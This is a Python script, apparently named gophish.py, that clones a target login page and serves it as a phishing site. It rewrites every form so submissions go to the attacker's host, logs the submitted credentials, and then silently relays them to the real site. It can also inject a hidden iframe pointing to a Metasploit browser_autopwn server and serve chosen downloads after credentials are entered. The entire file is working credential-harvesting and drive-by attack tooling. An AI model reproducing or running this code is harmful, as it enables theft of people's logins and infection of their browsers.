import re
import mechanize
import sys
import cherrypy
import datetime
import argparse
from bs4 import BeautifulSoup

# Build argument list for running the script
parser = argparse.ArgumentParser(prog='gophish.py', 
	formatter_class=argparse.ArgumentDefaultsHelpFormatter,
	description='Automatically setup a phishing site.',
	epilog='Example: gophish.py --phish https://www.victim.com/login.php --replace https://www.evil.com --port 443 --ssl --sslchain chain.crt --sslcert ssl.crt --sslkey ssl.key')
parser.add_argument('--phish', 
	required=True,
	help='the full URL to phish back to the victim (must include http(s)://)')
parser.add_argument('--replace', 
	required=True,
	help='the IP/FQDN to replace FORM actions with (must include http(s):// and final /)')
parser.add_argument('--logfile', 
	default='phishlog.txt',
	help='log file to store submitted form values')
parser.add_argument('--listen', 
	default='0.0.0.0',
	help='the IP to bind to')
parser.add_argument('--port', 
	default=80,
	type=int,
	help='the port to start the listening web server on')
parser.add_argument('--ssl', 
	action='store_const',
	const=1,
	default=1,
	help='enable SSL on the running port')
parser.add_argument('--sslchain', 
	default='chain.crt',
	help='certificate chain file to use when ssl option is enabled')
parser.add_argument('--sslcert', 
	default='ssl.crt',
	help='certificate file to use to use when ssl option is enabled')
parser.add_argument('--sslkey', 
	default='ssl.key',
	help='private key file to use to use when ssl option is enabled')
parser.add_argument('--autopwn', 
	help='Metasploit auxiliary/server/browser_autopwn URL to inject as an iFrame')
parser.add_argument('--autofill', 
	help='file to use to autosubmit autocomplete fields')
parser.add_argument('--redirect', 
	help='redirect requests for this address somewhere else')
parser.add_argument('--redirectto', 
	default='www.google.com',
	help='redirect requests in the redirect option to this address (full link, must include http(s)://)')
parser.add_argument('--landing', 
	help='redirect to this landing page instead of original site after form is submitted (include full link)')
parser.add_argument('--clickthrough', 
	help='file to serve up after user enters form credentials on main phish page')
parser.add_argument('--clickable', 
	help='used in combination with clickthrough, comma separated list of files to serve based on requested name')
parser.add_argument('--useragent', 
	help='file to use to pass a user agent value in the request')
parser.add_argument('--cookie', 
	help='send a cookie or cookies in the request')
parser.add_argument('--sendcookies', 
	action='store_const',
	const=1,
	default=1,
	help='initiate a connection, get the cookies, send cookies back in second connection')
parser.add_argument('--proxy',
        default='noproxy',
        help='access the page to be phished via a proxy')
parser.add_argument('--proxyport',
        default='noproxy',
        help='proxy port')
parser.add_argument('--proxyuser',
        default='',
        help='username for the proxy')
parser.add_argument('--proxypass',
        default='',
        help='password for the proxy')
parser.set_defaults(logfile='phishlog.txt', listen='0.0.0.0', port=80, ssl=0, sslchain='chain.crt', sslcert='ssl.crt', sslkey='ssl.key', redirectto='www.google.com', sendcookie=0)

# Hold argument values in args
args = vars(parser.parse_args())

# Find necessary portions of phish target and attack target.
# This includes protocol (http or https), FQDN, and the URI for each
phishsource = args['phish']
phishhost = args['replace']
phishget = phishsource.rsplit('/', 1)[0]+'/'
htype = phishget.split(':', 1)[0]
stype = phishhost.split(':', 1)[0]
remhttp = phishget.split(':', 1)[1]
sremhttp = phishhost.split(':', 1)[1]
domainget = remhttp.split('/', 1)[1].split('/', 1)[1].split('/', 1)[0]
hostget = sremhttp.split('/', 1)[1].split('/', 1)[1].split('/', 1)[0]
cherrylog = args['logfile']
redirecte = ''
redirectr = ''
clickfiles = dict()
proxy = args['proxy']
proxyport = args['proxyport']
proxyuser = args['proxyuser']
proxypass = args['proxypass']
proxycreds = ''

# Create a mechanized browser to connect to the phish target and grab the response
browse = mechanize.Browser()
browse.set_handle_robots(False)

# Disable certificate validation, mostly for if using a proxy
try:
  _create_unverified_https_context = ssl._create_unverified_context
except AttributeError:
  pass
else:
  ssl._create_default_https_context = _create_unverified_https_context

# Setup proxy if used
if re.search('^noproxy', proxy) is None:
  if re.search('[a-zA-Z0-9]', proxyuser) is not None and re.search('[a-zA-Z0-9]', proxyport) is not None:
    proxycreds = proxyuser + ':' + proxypass + '@'

  if re.search('^noproxy', proxyport) is None:
    browse.set_proxies({
      "http" : proxycreds + proxy + ':' + proxyport,
      "https" : proxycreds + proxy + ':' + proxyport,})
  else:
    browse.set_proxies({
      "http" : proxycreds + proxy,
      "https" : proxycreds + proxy,})

  if re.search('[a-zA-Z0-9]', proxyuser) is not None and re.search('[a-zA-Z0-9]', proxyport) is not None:
    browse.add_proxy_password(proxyuser, proxypass)

# Determine if user agent was set,
# if so then set argument, otherwise it is empty
if args['useragent'] is not None:
  uafile = open(args['useragent'], 'r')
  uaheader = uafile.readline()
  browse.addheaders = [('User-Agent', uaheader)]
  uafile.close()

# if cookie option was set, then send the cookie in the connection
if args['cookie'] is not None and args['useragent'] is not None:
  browse.addheaders.append('Cookie', args['cookie'])
else:
  browse.addheaders = [('Cookie', args['cookie'])]

# if sendcookies option was enabled, then connect,
# grab the cookies, and use them in the second connection
if args['sendcookies'] == 1:
  cookies = mechanize.LWPCookieJar()
  browse.set_cookiejar(cookies)
  browse.open(phishsource)

browse.open(phishsource)
phishpage = browse.response().read()
browse.close()

# Use Beautiful soup to handle the HTML response
soup = BeautifulSoup(phishpage, "lxml")

# If autopwn has been configured, implement functionality
if args['autopwn'] is not None:
  # First perform regex to make sure halfway proper link was submitted
  if re.search('^(http|https)\:\/\/[a-zA-Z0-9]+', args['autopwn']):
    # Build frame for HTML response and store in BeautifulSoup object
    evilframe = '<iframe width="10" scrolling="no" height="1" frameborder="0" src="'+args['autopwn']+'" seamless="seamless">'
    evilsoup = BeautifulSoup(evilframe)

    # Inject the evil frame into the original response
    for tag in evilsoup.findAll('iframe'):
      tag.extract()
      soup.body.insert(len(soup.body.contents), tag)

# Determine if redirection is being used, 
# if so then set arguments, otherwise they are empty
if args['redirect'] is not None:
  redirecte = args['redirect']
  redirectr = args['redirectto']
else:
  redirecte = None
  redirectr = None

# Determine if a landing page is being used, 
# if so then set argument, otherwise it is empty
if args['landing'] is not None:
  landing = args['landing']
else:
  landing = None

# Determine if a clickthrough page is being used, 
# if so then set argument, otherwise it is empty
if args['clickthrough'] is not None:
  clickthrough = args['clickthrough']

  # Check to see if a list of clickable files were provided.
  # If so, assign them to clickfiles
  if args['clickable'] is not None:
    clickable = args['clickable'].split(',')

    for click in clickable:
      clickfiles[click] = click
      
  else:
    clickable = None
else:
  clickthrough = None
  clickable = None

# Remove any javascript onsubmits that might interfere with the links
for linkonsub in soup.find_all('a', {"onsubmit":True}):
  linkonsub['onsubmit'] = ''

# Loop through all links found in HTML response, 
# replace with full links back to phish host
for link in soup.find_all('a'):
  if link.get('href') is not None and re.search('^#', link.get('href')) is None:
    if re.search('^javascript\:', link.get('href')) is None:
      if re.search('^(mailto|http|https|//|#$)', link.get('href')) is None:
        if re.search('^\/', link.get('href')):
          link['href'] = htype+'://'+domainget+link.get('href')
        else:
          link['href'] = phishget+link.get('href')
    else:
      link['onclick'] = ''

# Loop through all images found in HTML response, 
# replace with full link to image on phish host
for img in soup.find_all('img'):
  if re.search('^(http|https|//)', img.get('src')) is None:
    if re.search('^\/', img.get('src')): 
      img['src'] = htype+'://'+domainget+img.get('src')
    else:
      img['src'] = phishget+img.get('src')

# Loop through all style link tags found in HTML response, 
# replace with full link to css file on phish host
for styler in soup.find_all('link'):
  if re.search('^(http|https|//)', styler.get('href')) is None:
    if re.search('^\/', styler.get('href')):
      styler['href'] = htype+'://'+domainget+styler.get('href')
    else:
      styler['href'] = phishget+styler.get('href')

# Loop through all script tags found in HTML response, 
# replace with full link to script on phish host
for scripter in soup.find_all('script', {"src":True}):
  if re.search('^(http|https|//)', scripter.get('src')) is None:
    if re.search('^\/', scripter.get('src')): 
      scripter['src'] = htype+'://'+domainget+scripter.get('src')
    else:
      scripter['src'] = phishget+scripter.get('src')

# Loop through all embed tags found in HTML response, 
# replace with full link to script on phish host
for embedded in soup.find_all('embed', {"src":True}):
  if re.search('^(http|https|//)', embedded.get('src')) is None:
    if re.search('^\/', embedded.get('src')): 
      embedded['src'] = htype+'://'+domainget+embedded.get('src')
    else:
      embedded['src'] = phishget+embedded.get('src')

# Loop through all param tags found in HTML response, 
# replace with full link to script on phish host
for paramval in soup.find_all('param', {"value":True}):
  if re.search('^(http|https|//)', paramval.get('value')) is None:
    if re.search('^\/', paramval.get('value')): 
      paramval['src'] = htype+'://'+domainget+paramval.get('value')
    else:
      paramval['src'] = phishget+paramval.get('value')

# Loop through all meta tags found in HTML response, 
# replace with full link to phish host
for meta in soup.find_all('meta', {"content":True}):
  if re.search('^(http|https|//)', meta.get('content')) is None:
    if re.search('^\/', meta.get('content')) and re.search('\.', meta.get('content')): 
      meta['content'] = htype+'://'+domainget+meta.get('content')
    elif re.search('\.', meta.get('content')):
      meta['content'] = phishget+meta.get('content')

# Remove any javascript onsubmits that might interfere with the input
for inputonsub in soup.find_all('input', {"onsubmit":True}):
  inputonsub['onsubmit'] = ''

# Remove any javascript onclicks that might interfere with the input
for inputonclick in soup.find_all('input', {"onclick":True}):
  inputonclick['onclick'] = ''

# Remove any javascript onkeypresses that might interfere with the input
for inputkeypress in soup.find_all('input', {"onkeypress":True}):
  inputkeypress['onkeypress'] = ''

# Loop through all input tags found in HTML response, 
# replace src with full link to script on phish host
for inputer in soup.find_all('input', {"src":True}):
  if re.search('^(http|https|//)', inputer.get('src')) is None:
    if re.search('^\/', inputer.get('src')): 
      inputer['src'] = htype+'://'+domainget+inputer.get('src')
    else:
      inputer['src'] = phishget+inputer.get('src')

# Remove any javascript onclicks that might interfere with the form
for formonclick in soup.find_all('form', {"onclick":True}):
  formonclick['onclick'] = ''

# Remove any javascript onkeypresses that might interfere with the form
for formkeypress in soup.find_all('form', {"onkeypress":True}):
  formkeypress['onkeypress'] = ''

# Loop through all forms found in HTML response, 
# replace action with our attacking system
for form in soup.find_all('form'):
  if re.search('^(http|https|//)', form.get('action')) is None:
    if re.search('^\/', form.get('action')): 
      form['action'] = stype+'://'+hostget+form.get('action')
    else:
      form['action'] = stype+'://'+hostget+'/'+form.get('action')
  else:
    form['action'] = stype+'://'+hostget+'/'+form.get('action').split('/', 1)[1].split('/', 1)[1].split('/', 1)[1]

  # If the autofill feature was enabled, then open the autofill file
  # and inject each hidden autofill input type into the form
  if args['autofill'] is not None:
    autofile = open(args['autofill'], 'r')

    for line in autofile:
      if re.match('^#', line) is None:
        autoform = soup.new_tag(line)
        form.insert(0, autoform)

    autofile.close()

# Function for logging URL/File accessed and submitted form values
def logArgs(linkArgs, postArgs):
  indexList = ''
  formList = ''
  argTrue = False
  phishLog = open(cherrylog, 'a')

  # For all submitted form values, store in variable and
  # create form input values to be autosubmitted to the real site
  for key, value in postArgs.items():
    indexList = indexList+str(key)+' => '+str(value)+', '
    formList += '<input type="hidden" name="'+str(key)+'" value="'+str(value)+'"/>'
    argTrue = True

  # If there were arguments, log the data
  if argTrue:
    logTime = str(datetime.datetime.now())
    phishLog.write(logTime+': Redirect access, '+indexList[:-2]+'\n')

  phishLog.close()
  return formList

phishHtml = soup.prettify(formatter="html")

# BeautifulSoup fixes broken HTML, I do not want this to happen for &amp;
phishHtml = re.sub('&amp;', '&', phishHtml)

# Rewrite CSS url(), first look for all matches
urlCSS = re.findall(r'url\((.*)\)', phishHtml)

# Loop through matches and replace
for urls in urlCSS:
  if re.search('\)', urls):
    urls = urls.split(')')[0]

  checkQuotes = re.search('(\'|\")', urls)
  urlValue = ''
  useQuotes = ''

  # If quotes were used, remove the as part of the string
  # but add them around the URL
  if checkQuotes is not None:
    urlValue = str(urls)[1:-1]
    useQuotes = '"'
  else:
    urlValue = str(urls)
  
  # If preceeded by a forward slash, remove make sure we do not double slash
  if re.search('^(http|https|//)', urls) is not None:
    if re.search('^\/', urls):
      phishHtml = re.sub('url\('+str(urls)+'\)', 'url('+useQuotes+phishget[:-1]+urlValue+useQuotes+')', phishHtml)
    else:
      phishHtml = re.sub('url\('+str(urls)+'\)', 'url('+useQuotes+phishget+urlValue+useQuotes+')', phishHtml)

# Object for running cherrypy
class PhishForm(object):
  @cherrypy.expose

  # handler for all requests
  def default(self,*args,**kwargs):
    self.args = args
    self.kwargs = kwargs
    argTrue = False

    # If redirection is in use, log all submitted values then redirect
    if redirecte is not None and redirectr is not None and re.match(redirecte, cherrypy.request.headers['Host']):
      logArgs(self.args, self.kwargs)
      raise cherrypy.HTTPRedirect(redirectr, 302)

    # Check referer, if submitted to us AND from us
    # then time to redirect to landing or original page
    if re.match('^'+phishhost, cherrypy.request.headers.get("Referer", "/")):
      formList = logArgs(self.args, self.kwargs)

      # If there was submitted data, then formList should have been built with input tags
      if re.match('\<input\stype', formList) or clickfiles[cherrypy.url().split('/')[len(cherrypy.url().split('/'))-1]] is not None:

        # If landing was configured, redirect to it
        if landing is not None:
          raise cherrypy.HTTPRedirect(landing, 302)
        elif clickthrough is not None:

          # If clickable files were created, loop through and compare
          if clickable is not None:
            clickmatch = False
            clickurl = ''
            clickname = ''

            # For each clickable file, compare against what was submitted,
            # and if a match is found return it
            for file in clickfiles:

              # If the file matches the url, then load and send
              if re.match(phishhost+file, cherrypy.url()):
                clickmatch = True

                # If it is an htm(l) file, then read as ascii, otherwise binary
                if re.match('ht(m|ml)', file.split('.')[1]):
                  clickdata = open(clickfiles[file], 'r')
                  clickurl = clickdata.readlines()
                  clickdata.close()
                else:
                  clickdata = open(clickfiles[file], 'rb')
                  clickurl = clickdata.readlines()
                  clickdata.close()

                clickname = file

            # If a clickable file was matched, return in response,
            # otherwise return clickthrough file
            if clickmatch == True:

              # If this was an htm(l) file, then return, otherwise
              # send as file object
              if re.match('ht(m|ml)', clickname.split('.')[1]):
                return clickurl
              else:
                cherrypy.response.headers["Content-Type"] = "application/x-download"
                cherrypy.response.headers["Content-Disposition"] = 'attachment; filename='+clickname
                return clickurl
            else:
              pagedata = open(clickthrough, 'r')
              clickpage = pagedata.readlines()
              pagedata.close()
              return clickpage

          # If no clickable files were created, then return clickthrough file
          else:
            pagedata = open(clickthrough, 'r')
            clickpage = pagedata.readlines()
            pagedata.close()
            return clickpage
        else:
          methodType = 'POST'

          # If form was submitted via a GET request, build HTML form using GET, otherwise POST
          # Set the form to autopost with POST/GET.
          if re.search('^GET$', cherrypy.request.method):
            methodType = 'GET'

          postFormPhish = '<html><head></head><body onload="javascript:sendForms()"><script language="JavaScript">function sendForms(){ document.forms[0].submit(); }</script><form method="'+methodType+'" name="form0" action="'+htype+'://'+domainget+cherrypy.request.path_info+'">'+formList+'</form></body></html>'
          postsoup = BeautifulSoup(postFormPhish)
          postFormHtml = postsoup.prettify("iso-8859-1")
          return postFormHtml
      else:
        # Log any submitted arguments and return the original phish page
        logArgs(self.args, self.kwargs)
        return phishHtml.encode('utf-8').strip()
    else:
      # Log any submitted arguments and return the original phish page
      logArgs(self.args, self.kwargs)
      return phishHtml.encode('utf-8').strip()

# Configure cherrypy to bind to specified IP or default
cherrypy.server.socket_host = args['listen']

# If the SSL option was enabled, configure cherrypy to run over HTTPS
# using the correct certs, keys, and sslchain
if args['ssl'] == 1:
  cherrypy.server.ssl_module = 'builtin'
  cherrypy.server.ssl_certificate = args['sslcert']
  cherrypy.server.ssl_private_key = args['sslkey']
  cherrypy.server.ssl_certificate_chain = args['sslchain']

# Run cherrypy on the specified port or the default if not specified
cherrypy.server.socket_port = int(args['port'])
cherrypy.quickstart(PhishForm(), '/', config = { '/favicon.ico' : { 'tools.staticfile.on': False }})
